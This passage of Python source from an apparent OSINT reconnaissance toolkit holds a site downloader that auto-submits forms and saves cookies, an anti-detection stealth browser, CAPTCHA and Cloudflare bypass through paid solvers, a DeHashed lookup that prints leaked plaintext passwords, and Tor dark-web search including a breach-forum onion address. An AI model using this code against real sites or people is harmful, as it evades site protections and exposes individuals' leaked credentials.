    print(f"{Wh} DNSdumpster    : {C}https://dnsdumpster.com/static/map/{domain}.png{RS}")
    
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="domain",
        target=domain,
        data=data
    )
    save_report(result)
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")


def download_with_form_submission(url: str, session: requests.Session, output_dir: Path) -> Dict:
    """تحميل صفحات تحتاج إلى POST أو Forms"""
    downloaded = []
    
    try:
        resp = session.get(url, timeout=CONFIG["request_timeout"])
        html = resp.text
        
        index_file = output_dir / "index.html"
        with open(index_file, 'w', encoding='utf-8') as f:
            f.write(html)
        downloaded.append(str(index_file))
        
        if BeautifulSoup:
            soup = BeautifulSoup(html, 'html.parser')
            
            forms = soup.find_all('form')
            
            for i, form in enumerate(forms):
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                
                if action:
                    if not action.startswith(('http://', 'https://')):
                        action = urljoin(url, action)
                else:
                    action = url
                
                form_data = {}
                inputs = form.find_all(['input', 'textarea', 'select'])
                
                for inp in inputs:
                    inp_name = inp.get('name', '')
                    inp_type = inp.get('type', 'text')
                    inp_value = inp.get('value', '')
                    
                    if inp_name:
                        if inp_type == 'hidden':
                            form_data[inp_name] = inp_value
                        else:
                            if 'user' in inp_name.lower() or 'name' in inp_name.lower():
                                form_data[inp_name] = 'testuser_osint'
                            elif 'pass' in inp_name.lower() or 'pwd' in inp_name.lower():
                                form_data[inp_name] = 'testpass_osint123'
                            elif 'email' in inp_name.lower():
                                form_data[inp_name] = 'osint_test@example.com'
                            elif 'confirm' in inp_name.lower():
                                form_data[inp_name] = 'testpass_osint123'
                            elif 'phone' in inp_name.lower():
                                form_data[inp_name] = '+1234567890'
                            else:
                                form_data[inp_name] = inp_value if inp_value else f'test_{inp_name}'
                
                try:
                    if method == 'POST':
                        response = session.post(action, data=form_data, timeout=15, allow_redirects=True)
                    else:
                        response = session.get(action, params=form_data, timeout=15, allow_redirects=True)
                    
                    form_file = output_dir / f"form_{i+1}_response.html"
                    with open(form_file, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    downloaded.append(str(form_file))
                    
                    for hist_idx, hist in enumerate(response.history):
                        hist_file = output_dir / f"redirect_{hist_idx+1}.html"
                        with open(hist_file, 'w', encoding='utf-8') as f:
                            f.write(hist.text)
                        downloaded.append(str(hist_file))
                    
                    print(f"    {Gr}[+] Form #{i+1} submitted, saved response{Wh}")
                    
                except Exception as e:
                    print(f"    {Y}[!] Form #{i+1} submission failed: {str(e)[:50]}{Wh}")
            
            important_links = []
            for link in soup.find_all('a', href=True):
                href = link['href']
                text = link.get_text().lower()
                if any(word in text for word in ['login', 'register', 'signin', 'signup', 'تسجيل', 'دخول']):
                    if not href.startswith(('http://', 'https://')):
                        href = urljoin(url, href)
                    important_links.append(href)
            
            for link in important_links[:10]:
                try:
                    resp = session.get(link, timeout=10)
                    filename = re.sub(r'[^\w\-_.]', '_', link.split('/')[-1] or 'page') + '.html'
                    filepath = output_dir / filename
                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write(resp.text)
                    downloaded.append(str(filepath))
                    print(f"    {Gr}[+] Downloaded: {filename}{Wh}")
                except:
                    pass
        
        return {'downloaded': downloaded, 'success': True}
        
    except Exception as e:
        return {'downloaded': downloaded, 'success': False, 'error': str(e)}


def download_with_cookies_persistence(url: str, session: requests.Session, output_dir: Path) -> Dict:
    """تحميل الموقع مع حفظ الكوكيز والجلسة"""
    downloaded = []
    
    try:
        resp = session.get(url, timeout=CONFIG["request_timeout"])
        
        index_file = output_dir / "index.html"
        with open(index_file, 'w', encoding='utf-8') as f:
            f.write(resp.text)
        downloaded.append(str(index_file))
        
        if session.cookies:
            cookie_file = output_dir / "cookies.txt"
            with open(cookie_file, 'w', encoding='utf-8') as f:
                for cookie in session.cookies:
                    f.write(f"{cookie.name}={cookie.value}\n")
            downloaded.append(str(cookie_file))
        
        if BeautifulSoup:
            soup = BeautifulSoup(resp.text, 'html.parser')
            domain = urlparse(url).netloc
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href and not href.startswith(('#', 'javascript:', 'mailto:')):
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    
                    if parsed.netloc == domain or not parsed.netloc:
                        try:
                            page_resp = session.get(full_url, timeout=10)
                            filename = re.sub(r'[^\w\-_.]', '_', parsed.path or 'index') + '.html'
                            if filename == '.html':
                                filename = 'index.html'
                            filepath = output_dir / filename
                            with open(filepath, 'w', encoding='utf-8') as f:
                                f.write(page_resp.text)
                            downloaded.append(str(filepath))
                        except:
                            pass
        
        return {'downloaded': downloaded, 'success': True}
        
    except Exception as e:
        return {'downloaded': downloaded, 'success': False, 'error': str(e)}


def download_website_source(url: str, output_dir: Path) -> Dict:
    """تحميل سورس كود الموقع بالكامل مع دعم النماذج"""
    session = get_session()
    result = {'downloaded': [], 'errors': [], 'forms_processed': 0}
    
    print(f"\n{Y}[*] Starting source code download for: {url}{Wh}")
    
    print(f"{Wh}[*] Fetching main page with cookies...{Wh}")
    normal_result = download_with_cookies_persistence(url, session, output_dir)
    result['downloaded'].extend(normal_result.get('downloaded', []))
    
    print(f"{Wh}[*] Detecting and processing forms...{Wh}")
    form_result = download_with_form_submission(url, session, output_dir)
    result['downloaded'].extend(form_result.get('downloaded', []))
    result['forms_processed'] = len([f for f in form_result.get('downloaded', []) if 'form_' in f])
    
    if not normal_result.get('success') and not form_result.get('success'):
        result['errors'].append("Failed to download")
    
    print(f"{Wh}[*] Downloading assets (JS, CSS)...{Wh}")
    try:
        resp = session.get(url, timeout=CONFIG["request_timeout"])
        if BeautifulSoup:
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            assets_dir = output_dir / "assets"
            assets_dir.mkdir(exist_ok=True)
            
            for script in soup.find_all('script', src=True):
                src = script['src']
                if src and not src.startswith('data:'):
                    if not src.startswith(('http://', 'https://')):
                        src = urljoin(url, src)
                    try:
                        asset_resp = session.get(src, timeout=10)
                        filename = src.split('/')[-1] or 'script.js'
                        if not filename.endswith('.js'):
                            filename += '.js'
                        filepath = assets_dir / filename
                        with open(filepath, 'wb') as f:
                            f.write(asset_resp.content)
                        result['downloaded'].append(str(filepath))
                    except:
                        pass
            
            for css in soup.find_all('link', rel='stylesheet'):
                href = css.get('href')
                if href:
                    if not href.startswith(('http://', 'https://')):
                        href = urljoin(url, href)
                    try:
                        asset_resp = session.get(href, timeout=10)
                        filename = href.split('/')[-1] or 'style.css'
                        if not filename.endswith('.css'):
                            filename += '.css'
                        filepath = assets_dir / filename
                        with open(filepath, 'wb') as f:
                            f.write(asset_resp.content)
                        result['downloaded'].append(str(filepath))
                    except:
                        pass
    except:
        pass
    
    return result


def website_downloader():
    if BeautifulSoup is None:
        print(f"{R}[!] Install BeautifulSoup4: pip install beautifulsoup4{RS}")
        input(f"\n{Wh}[+] Press Enter")
        return

    print(f"\n {Wh}{'='*55}")
    print(f" {R} WEBSITE SOURCE DOWNLOADER")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Supports: Forms (POST/GET), Cookies, Assets (JS/CSS){Wh}")

    url = input(f"\n{Wh}[?] Enter website URL {Gr}[e.g., example.com]{Wh}: {Gr}").strip()
    if not url:
        print(f"{R}[!] URL cannot be empty!")
        input(f"\n{Wh}[+] Press Enter")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    print(f"\n{Y}[*] Target: {url}")
    
    depth_input = input(f"\n{Wh}[?] Max depth {Gr}[0=unlimited, default=2]{Wh}: {Gr}").strip()
    max_depth = int(depth_input) if depth_input.isdigit() else 2

    links_input = input(f"{Wh}[?] Max pages {Gr}[default=50]{Wh}: {Gr}").strip()
    max_links = int(links_input) if links_input.isdigit() else 50

    confirm = input(f"\n{Wh}[?] Start download? {Gr}(y/n){Wh}: {Gr}").strip().lower()
    if confirm != 'y':
        print(f"{Y}[!] Cancelled")
        input(f"\n{Wh}[+] Press Enter")
        return

    parsed = urlparse(url)
    domain = parsed.netloc
    safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
    out_dir = Path(CONFIG["output_dir"]) / "websites" / safe_domain
    out_dir.mkdir(parents=True, exist_ok=True)

    print(f"\n{Gr}[*] Starting download...{Wh}")
    print(f"{Y}[*] Output directory: {out_dir}{Wh}")
    
    start_time = time.time()
    
    try:
        result = download_website_source(url, out_dir)
        
        if max_depth > 0:
            session = get_session()
            visited = set([url])
            q_list = [(url, 0)]
            all_downloaded = list(result['downloaded'])
            
            while q_list and len(all_downloaded) < max_links:
                current_url, depth = q_list.pop(0)
                if depth >= max_depth:
                    continue
                
                try:
                    resp = session.get(current_url, timeout=CONFIG["request_timeout"])
                    if BeautifulSoup:
                        soup = BeautifulSoup(resp.text, 'html.parser')
                        
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            if href and not href.startswith(('#', 'javascript:', 'mailto:')):
                                full_url = urljoin(current_url, href)
                                parsed_full = urlparse(full_url)
                                
                                if parsed_full.netloc == domain and full_url not in visited:
                                    visited.add(full_url)
                                    
                                    try:
                                        page_resp = session.get(full_url, timeout=10)
                                        filename = re.sub(r'[^\w\-_.]', '_', parsed_full.path or 'index')
                                        if not filename or filename == '_':
                                            filename = 'page'
                                        filepath = out_dir / f"{filename}_{depth+1}.html"
                                        with open(filepath, 'w', encoding='utf-8') as f:
                                            f.write(page_resp.text)
                                        all_downloaded.append(str(filepath))
                                        print(f"    {Gr}[+] Downloaded: {filename}.html{Wh}")
                                        q_list.append((full_url, depth + 1))
                                    except:
                                        pass
                except:
                    pass
            
            result['downloaded'] = all_downloaded
        
        elapsed = time.time() - start_time
        
        print(f"\n {Wh}{'='*55}")
        print(f" {Gr} DOWNLOAD COMPLETE")
        print(f" {Wh}{'='*55}")
        print(f"{Wh} Files Downloaded: {Gr}{len(result['downloaded'])}")
        print(f"{Wh} Forms Processed:  {Gr}{result.get('forms_processed', 0)}")
        print(f"{Wh} Errors:          {R}{len(result.get('errors', []))}")
        print(f"{Wh} Time Taken:      {Gr}{elapsed:.1f}s")
        print(f"{Wh} Output Dir:      {C}{out_dir}{RS}")
        
        manifest_file = out_dir / "download_manifest.txt"
        with open(manifest_file, 'w', encoding='utf-8') as f:
            f.write(f"URL: {url}\n")
            f.write(f"Date: {datetime.now().isoformat()}\n")
            f.write(f"Total Files: {len(result['downloaded'])}\n")
            f.write("="*60 + "\n\n")
            for filepath in result['downloaded']:
                f.write(f"{filepath}\n")
        
        print(f"{Gr}[+] Manifest saved: {manifest_file}{Wh}")
        
        scan_result = ScanResult(
            timestamp=datetime.now().isoformat(),
            scan_type="website_download",
            target=url,
            data={
                "files_downloaded": len(result['downloaded']),
                "output_dir": str(out_dir),
                "manifest": str(manifest_file)
            }
        )
        save_report(scan_result)
        
    except Exception as e:
        print(f"{R}[!] Error: {e}{Wh}")
    
    input(f"\n{Wh}[+] Press Enter")

USERNAME_CONFIDENCE_RULES = {
    "high_confidence": {
        "weight": 1.0,
        "conditions": [
            {"status_code": 200, "has_username": True, "not_found_absent": True, "has_profile_data": True},
        ]
    },
    "medium_high": {
        "weight": 0.75,
        "conditions": [
            {"status_code": 200, "has_username": True, "not_found_absent": True},
            {"status_code": 200, "has_username_in_title": True, "not_found_absent": True},
        ]
    },
}

def analyze_page_confidence(url: str, name: str, status_code: int, body: str, headers: dict) -> Dict:
    score = 0
    signals = []
    body_lower = body.lower()
    username = url.rstrip('/').split('/')[-1]

    if status_code == 200:
        score += 20
        signals.append("HTTP 200 OK")
    elif status_code == 403:
        score += 40
        signals.append("HTTP 403 (rate limit/auth required - profile likely exists)")
    elif status_code == 302 or status_code == 301:
        score += 10
        signals.append(f"HTTP {status_code} redirect")
    elif status_code == 404:
        score += 0
        signals.append("HTTP 404")
    elif status_code >= 500:
        score += 5
        signals.append(f"HTTP {status_code} server error")

    not_found_patterns = NOT_FOUND_PATTERNS.get(name, [])
    found_not_found = any(p in body_lower for p in not_found_patterns) if not_found_patterns else False

    if status_code == 200 and not_found_patterns:
        if found_not_found:
            score = max(0, score - 15)
            signals.append("Not-found pattern detected (-15)")
        else:
            score += 30
            signals.append("No not-found patterns (+30)")

    if status_code == 200:
        username_variants = [username.lower(), username.lower().replace('_', ''), username.lower().replace('-', '')]
        if any(v in body_lower for v in username_variants):
            score += 25
            signals.append("Username found in page content (+25)")
        title_match = re.search(r'<title[^>]*>([^<]+)</title>', body, re.I)
        if title_match and username.lower() in title_match.group(1).lower():
            score += 15
            signals.append("Username in page title (+15)")

    if status_code == 200 and not found_not_found:
        profile_indicators = {
            'avatar': 8, 'profile': 7, 'joined': 5, 'followers': 6, 'following': 6,
            'member since': 4, 'location': 5, 'website': 4, 'bio': 5, 'about': 4,
            'posts': 5, 'karma': 4, 'reputation': 5, 'stats': 3, 'created': 4,
        }
        for indicator, pts in profile_indicators.items():
            if indicator in body_lower:
                score += pts
                signals.append(f"Profile indicator '{indicator}' (+{pts})")

        content_length = len(body)
        if content_length > 50000:
            score += 5
            signals.append("Rich page content (+5)")
        elif content_length > 10000:
            score += 3
            signals.append("Moderate page content (+3)")

    if status_code == 200:
        if 'og:title' in body_lower or 'twitter:title' in body_lower:
            score += 5
            signals.append("Open Graph tags present (+5)")
        if 'profile' in body_lower and 'url' in body_lower:
            score += 3
            signals.append("Structured profile data (+3)")

    if status_code == 403:
        score += 25
        signals.append("Blocked but profile may exist (+25)")

    score = max(0, min(100, score))

    confidence_label = "VERY HIGH" if score >= 85 else "HIGH" if score >= 70 else "MEDIUM" if score >= 45 else "LOW" if score >= 20 else "NONE"

    return {
        "score": score,
        "confidence": confidence_label,
        "signals": signals[:8],
        "status_code": status_code,
    }

def check_platform_rated(site: Dict, username: str, session: requests.Session) -> Tuple[str, Dict]:
    url = site['url'].format(username)
    name = site['name']
    try:
        random_delay()
        response = session.get(url, timeout=CONFIG["request_timeout"], allow_redirects=True)
        body = response.text[:2000] if response.status_code == 200 else ""
        headers = dict(response.headers)
        response.close()

        confidence = analyze_page_confidence(url, name, response.status_code, body, headers)

        is_found = confidence["score"] >= 40

        return name, {
            "url": url,
            "status": "found" if is_found else "not_found",
            "score": confidence["score"],
            "confidence": confidence["confidence"],
            "signals": confidence["signals"],
            "status_code": response.status_code,
        }
    except Exception as e:
        return name, {
            "url": url,
            "status": "error",
            "score": 0,
            "confidence": "ERROR",
            "error": str(e)[:50],
        }


STEALTH_CONFIG = {
    "headless": True,
    "viewport_width": 1920,
    "viewport_height": 1080,
    "timezone": "auto",
    "locale": "en-US",
    "proxy": None,
    "user_agent_rotate": True,
}

class StealthBrowser:
    def __init__(self):
        self.browser = None
        self.context = None
        self.page = None
        self._playwright = None

    def _get_random_viewport(self):
        sizes = [
            (1920, 1080), (1366, 768), (1536, 864), (1440, 900),
            (1280, 720), (1600, 900), (1680, 1050),
        ]
        return random.choice(sizes)

    def _get_random_timezone(self):
        tzs = [
            "America/New_York", "America/Chicago", "America/Denver",
            "America/Los_Angeles", "Europe/London", "Europe/Berlin",
            "Europe/Paris", "Asia/Tokyo", "Asia/Shanghai",
            "Australia/Sydney", "Asia/Dubai",
        ]
        return random.choice(tzs)

    def start(self, proxy: str = None):
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            print(f"{Y}[!] Install playwright: pip install playwright && playwright install{RS}")
            return False

        self._playwright = sync_playwright().start()
        width, height = self._get_random_viewport()

        launch_options = {
            "headless": STEALTH_CONFIG["headless"],
            "args": [
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-site-isolation-trials",
                f"--window-size={width},{height}",
            ],
        }

        self.browser = self._playwright.chromium.launch(**launch_options)

        context_options = {
            "viewport": {"width": width, "height": height},
            "locale": STEALTH_CONFIG["locale"],
            "timezone_id": self._get_random_timezone(),
            "user_agent": random.choice(CONFIG["user_agents"]),
            "no_viewport": False,
        }

        if proxy:
            context_options["proxy"] = {"server": proxy}

        self.context = self.browser.new_context(**context_options)

        self.context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
            Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
            window.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'permissions', { get: () => ({ query: async () => ({ state: 'granted' }) }) });
        """)

        self.page = self.context.new_page()
        return True

    def navigate(self, url: str, timeout: int = 30000):
        if not self.page:
            return None
        try:
            resp = self.page.goto(url, wait_until="domcontentloaded", timeout=timeout)
            self.page.wait_for_timeout(random.randint(1000, 3000))
            content = self.page.content()
            return {
                "status": resp.status if resp else 0,
                "content": content,
                "url": self.page.url,
                "cookies": self.context.cookies(),
            }
        except Exception as e:
            return {"status": 0, "content": "", "error": str(e)}

    def screenshot(self, path: str = "stealth_screenshot.png"):
        if self.page:
            self.page.screenshot(path=path, full_page=True)

    def close(self):
        if self.browser:
            self.browser.close()
        if self._playwright:
            self._playwright.stop()

def stealth_browser_scan(url: str, proxy: str = None) -> Dict:
    browser = StealthBrowser()
    if not browser.start(proxy):
        return {"error": "Playwright not available"}
    try:
        result = browser.navigate(url)
        return result
    finally:
        browser.close()


CAPTCHA_CONFIG = {
    "service": "2captcha",
    "api_key": "",
    "timeout": 120,
}

class CaptchaSolver:
    def __init__(self, api_key: str = "", service: str = "2captcha"):
        self.api_key = api_key or CAPTCHA_CONFIG["api_key"]
        self.service = service
        self.base_url = {
            "2captcha": "https://2captcha.com",
            "capsolver": "https://api.capsolver.com",
        }.get(service, "https://2captcha.com")

    def solve_recaptcha_v2(self, site_key: str, page_url: str) -> str:
        if not self.api_key:
            return ""
        try:
            if self.service == "2captcha":
                resp = requests.post(f"{self.base_url}/in.php", data={
                    "key": self.api_key, "method": "userrecaptcha",
                    "googlekey": site_key, "pageurl": page_url, "json": 1,
                }, timeout=30)
                if resp.json().get("status") == 1:
                    request_id = resp.json()["request"]
                    for _ in range(30):
                        time.sleep(5)
                        result = requests.get(f"{self.base_url}/res.php?key={self.api_key}&action=get&id={request_id}&json=1", timeout=30)
                        if result.json().get("status") == 1:
                            return result.json()["request"]
                        if result.json().get("request") == "ERROR_CAPTCHA_UNSOLVABLE":
                            break
            elif self.service == "capsolver":
                resp = requests.post(f"{self.base_url}/createTask", json={
                    "clientKey": self.api_key,
                    "task": {
                        "type": "ReCaptchaV2TaskProxyless",
                        "websiteURL": page_url,
                        "websiteKey": site_key,
                    }
                }, timeout=30)
                task_id = resp.json().get("taskId")
                if task_id:
                    for _ in range(30):
                        time.sleep(3)
                        result = requests.post(f"{self.base_url}/getTaskResult", json={
                            "clientKey": self.api_key, "taskId": task_id
                        }, timeout=30)
                        if result.json().get("status") == "ready":
                            return result.json()["solution"]["gRecaptchaResponse"]
        except:
            pass
        return ""

    def solve_cloudflare(self, page_url: str) -> Dict:
        try:
            resp = requests.post("https://api.capsolver.com/createTask", json={
                "clientKey": self.api_key,
                "task": {
                    "type": "AntiCloudflareTask",
                    "websiteURL": page_url,
                    "proxy": None,
                }
            }, timeout=30)
            task_id = resp.json().get("taskId")
            if task_id:
                for _ in range(40):
                    time.sleep(5)
                    result = requests.post("https://api.capsolver.com/getTaskResult", json={
                        "clientKey": self.api_key, "taskId": task_id
                    }, timeout=30)
                    if result.json().get("status") == "ready":
                        return result.json()
        except:
            pass
        return {}

captcha_solver = CaptchaSolver()


DEHASHED_CONFIG = {
    "email": "",
    "api_key": "",
}

def search_dehashed(query: str, query_type: str = "auto") -> Dict:
    if not DEHASHED_CONFIG["email"] or not DEHASHED_CONFIG["api_key"]:
        return {"error": "DeHashed API credentials not configured", "results": []}

    type_map = {
        "email": "email", "username": "username", "phone": "phone",
        "name": "name", "ip": "ip_address", "domain": "domain",
        "password": "password", "address": "address",
    }
    if query_type == "auto":
        if "@" in query:
            query_type = "email"
        elif re.match(r'^\+?\d{8,15}$', query):
            query_type = "phone"
        elif validate_ip(query):
            query_type = "ip_address"
        elif "." in query and " " not in query:
            query_type = "domain"
        else:
            query_type = "username"

    search_type = type_map.get(query_type, "username")

    try:
        auth = requests.auth.HTTPBasicAuth(DEHASHED_CONFIG["email"], DEHASHED_CONFIG["api_key"])
        params = {
            "query": f"{search_type}:\"{query}\"",
            "size": 50,
            "page": 1,
        }
        resp = requests.get(
            "https://api.dehashed.com/search",
            auth=auth,
            params=params,
            headers={"Accept": "application/json"},
            timeout=30,
        )
        if resp.status_code == 200:
            data = resp.json()
            entries = data.get("entries", [])
            total = data.get("total", 0)
            return {
                "total": total,
                "results": [{
                    "email": e.get("email", "N/A"),
                    "username": e.get("username", "N/A"),
                    "password": e.get("password", "***") if e.get("password") else "N/A",
                    "hash": e.get("hash", "N/A")[:20] if e.get("hash") else "N/A",
                    "name": e.get("name", "N/A"),
                    "ip": e.get("ip_address", "N/A"),
                    "phone": e.get("phone", "N/A"),
                    "address": e.get("address", "N/A"),
                    "database": e.get("database_name", "N/A"),
                    "date": str(e.get("date", "N/A"))[:10],
                } for e in entries[:30]],
                "query": query,
                "source": "DeHashed",
            }
        elif resp.status_code == 401:
            return {"error": "Invalid DeHashed credentials", "results": []}
        else:
            return {"error": f"DeHashed API error: {resp.status_code}", "results": []}
    except Exception as e:
        return {"error": f"DeHashed error: {str(e)[:60]}", "results": []}

def dehashed_menu():
    print(f"\n {Wh}{'='*50}")
    print(f" {R} DEHASHED BREACH SEARCH")
    print(f" {Wh}{'='*50}")
    print(f"{Wh}[?] Search by: {Gr}email, username, phone, ip, domain, name, password{Wh}")
    query = input(f"\n{Wh}[+] Query: {Gr}").strip()
    if not query:
        return

    if not DEHASHED_CONFIG["email"] or not DEHASHED_CONFIG["api_key"]:
        print(f"\n{Y}[!] DeHashed API not configured.{Wh}")
        print(f"{Y}    Set credentials in CONFIG or DEHASHED_CONFIG dict.{Wh}")
        print(f"{Y}    Register at: https://dehashed.com/register{Wh}")
        input(f"\n{Wh}[+] Press Enter")
        return

    qtype = input(f"{Wh}[?] Type {Gr}[auto/email/username/phone/ip_address/domain]{Wh}: {Gr}").strip() or "auto"

    print(f"\n{Y}[*] Searching DeHashed for '{query}'...{Wh}")
    results = search_dehashed(query, qtype)

    if "error" in results:
        print(f"{R}[!] {results['error']}{Wh}")
        input(f"\n{Wh}[+] Press Enter")
        return

    total = results.get("total", 0)
    entries = results.get("results", [])

    print(f"\n{Gr}[+] Found {total} total entries (showing {len(entries)}){Wh}")

    if entries:
        for i, e in enumerate(entries[:15], 1):
            print(f"\n{Wh} Entry #{i} ")
            if e.get("email") and e["email"] != "N/A":
                print(f"{Wh} Email    : {Gr}{e['email']}")
            if e.get("username") and e["username"] != "N/A":
                print(f"{Wh} Username : {Gr}{e['username']}")
            if e.get("name") and e["name"] != "N/A":
                print(f"{Wh} Name     : {Gr}{e['name']}")
            if e.get("password") and e["password"] != "***":
                print(f"{R} Password : {R}{e['password']}{Wh}")
            if e.get("hash") and e["hash"] != "N/A":
                print(f"{Wh} Hash     : {Y}{e['hash']}")
            if e.get("database"):
                print(f"{Wh} Database : {Y}{e['database']}")
            if e.get("date") and e["date"] != "N/A":
                print(f"{Wh} Date     : {Y}{e['date']}")

    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="dehashed",
        target=query,
        data=results
    )
    save_report(result)
    input(f"\n{Wh}[+] Press Enter")


DARKWEB_CONFIG = {
    "tor_proxy": "socks5h://127.0.0.1:9050",
    "tor_control_port": 9051,
    "tor_password": "",
    "timeout": 60,
}

ONION_SITES = {
    "ahmia": "http://juhanluuauskqvtnk4ys2h5un7bbxk5tqsryo5y3l5h4buomjunqyd.onion",
    "torch": "http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5avgiewkeckvyq4c3xid.onion",
    "darksearch": "http://darksearchivv5gvfk4kftvjirrl3qnidr26qwxje5de7hiagy3r6qyd.onion",
    "breachforums": "http://breachedu76k2f5gygsglqy3kyrxmhzeqoh3xtgmglzfg7r3wi3wimyd.onion",
}

def stealth_browser_menu():
    print(f"\n {Wh}{'='*50}")
    print(f" {R} STEALTH BROWSER (Anti-Detection)")
    print(f" {Wh}{'='*50}")
    print(f"{Y}[!] Uses Playwright with anti-fingerprinting{Wh}")
    print(f"{Y}[!] Spoofs: WebDriver, Canvas, WebGL, Fonts, Timezone{Wh}")

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print(f"\n{R}[!] Playwright not installed.{Wh}")
        print(f"{Y}    Install: pip install playwright && playwright install chromium{Wh}")
        input(f"\n{Wh}[+] Press Enter")
        return

    url = input(f"\n{Wh}[+] URL to visit with stealth: {Gr}").strip()
    if not url:
        return
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    proxy = input(f"{Wh}[+] Proxy {Gr}[optional, e.g., socks5://127.0.0.1:9050]{Wh}: {Gr}").strip() or None

    print(f"\n{Y}[*] Launching stealth browser...{Wh}")
    browser = StealthBrowser()
    if not browser.start(proxy):
        return

    try:
        print(f"{Y}[*] Navigating to: {url}{Wh}")
        result = browser.navigate(url, timeout=45000)

        if result and result.get("status"):
            print(f"{Gr}[+] Status: {result['status']}{Wh}")
            print(f"{Wh}[+] Final URL: {C}{result.get('url', url)}{RS}")
            print(f"{Wh}[+] Content length: {Gr}{len(result.get('content', ''))} bytes")

            if input(f"\n{Wh}[?] Take screenshot? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
                ss_path = Path(CONFIG["output_dir"]) / f"stealth_{int(time.time())}.png"
                browser.screenshot(str(ss_path))
                print(f"{Gr}[+] Screenshot saved: {ss_path}{Wh}")

            cookies = result.get("cookies", [])
            if cookies:
                print(f"{Wh}[+] Cookies captured: {Gr}{len(cookies)}{Wh}")

            data = {
                "url": url,
                "status": result.get("status"),
                "final_url": result.get("url"),
                "content_length": len(result.get("content", "")),
                "cookies": len(cookies),
            }
            scan_result = ScanResult(
                timestamp=datetime.now().isoformat(),
                scan_type="stealth_browser",
                target=url,
                data=data
            )
            save_report(scan_result)
        else:
            error = result.get("error", "Unknown error") if result else "Failed to launch"
            print(f"{R}[!] Error: {error}{Wh}")
    finally:
        browser.close()
    input(f"\n{Wh}[+] Press Enter")

def check_tor_available() -> bool:
    try:
        session = requests.Session()
        session.proxies = {"http": DARKWEB_CONFIG["tor_proxy"], "https": DARKWEB_CONFIG["tor_proxy"]}
        resp = session.get("http://check.torproject.org/", timeout=15)
        return "congratulations" in resp.text.lower()
    except:
        return False

def search_ahmia(query: str) -> Dict:
    results = {"onion_links": [], "descriptions": [], "total": 0}
    try:
        session = requests.Session()
        session.proxies = {"http": DARKWEB_CONFIG["tor_proxy"], "https": DARKWEB_CONFIG["tor_proxy"]}
        session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})

        resp = session.get(
            f"http://juhanluuauskqvtnk4ys2h5un7bbxk5tqsryo5y3l5h4buomjunqyd.onion/search/?q={query}",
            timeout=DARKWEB_CONFIG["timeout"],
        )
        if resp.status_code == 200:
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, "html.parser")
                for result_div in soup.select(".result") or soup.find_all("li"):
                    link = result_div.find("a")
                    if link and link.get("href", "").endswith(".onion"):
                        results["onion_links"].append(link["href"])
                        desc = result_div.get_text(strip=True)[:150]
                        results["descriptions"].append(desc)
                results["total"] = len(results["onion_links"])
    except:
        pass
    return results

def check_onion_availability(onion_url: str) -> Dict:
    try:
        session = requests.Session()
        session.proxies = {"http": DARKWEB_CONFIG["tor_proxy"], "https": DARKWEB_CONFIG["tor_proxy"]}
        session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
        resp = session.get(onion_url, timeout=30)
        return {"reachable": resp.status_code == 200, "status": resp.status_code, "title": extract_title(resp.text)}
    except:
        return {"reachable": False, "status": 0, "title": ""}

def extract_title(html: str) -> str:
    m = re.search(r'<title[^>]*>([^<]+)</title>', html, re.I)
    return m.group(1).strip()[:80] if m else ""

def search_darkweb(query: str) -> Dict:
    results = {
        "query": query,
        "tor_available": check_tor_available(),
        "ahmia": {"onion_links": [], "total": 0},
        "tested_onions": [],
        "summary": "",
    }

    if not results["tor_available"]:
        results["summary"] = "Tor not available. Start Tor service first."
        return results

    print(f"{Y}[*] Searching Ahmia.fi (dark web index)...{Wh}")
    ahmia = search_ahmia(query)
    results["ahmia"] = ahmia

    if ahmia["onion_links"]:
        print(f"{Gr}[+] Found {ahmia['total']} onion links. Testing availability...{Wh}")
        for link in ahmia["onion_links"][:5]:
            status = check_onion_availability(link)
            results["tested_onions"].append({"url": link, **status})
            if status["reachable"]:
                print(f"    {Gr}[+] {link[:50]}... - Reachable: {status.get('title', 'N/A')}")
            else:
                print(f"    {Y}[-] {link[:50]}... - Unreachable")
    else:
        print(f"{Y}[-] No results from Ahmia. Try different query or ensure Tor is running.{Wh}")

    results["summary"] = f"Found {ahmia['total']} onion links, {sum(1 for o in results['tested_onions'] if o.get('reachable'))} reachable"
    return results

def darkweb_menu():
    print(f"\n {Wh}{'='*50}")
    print(f" {R} DARK WEB OSINT")
    print(f" {Wh}{'='*50}")

    if not check_tor_available():
        print(f"{Y}[!] Tor is not running. Start Tor service first.{Wh}")
        print(f"{Y}    Download: https://www.torproject.org/download/{Wh}")
        print(f"{Y}    Or run: (start Tor Browser / tor service){Wh}")
        if input(f"\n{Wh}[?] Attempt anyway? {Gr}(y/n){Wh}: {Gr}").strip().lower() != 'y':
            return

    query = input(f"\n{Wh}[+] Search query: {Gr}").strip()
    if not query:
        return

    print(f"\n{Y}[*] Searching dark web for '{query}'...{Wh}")
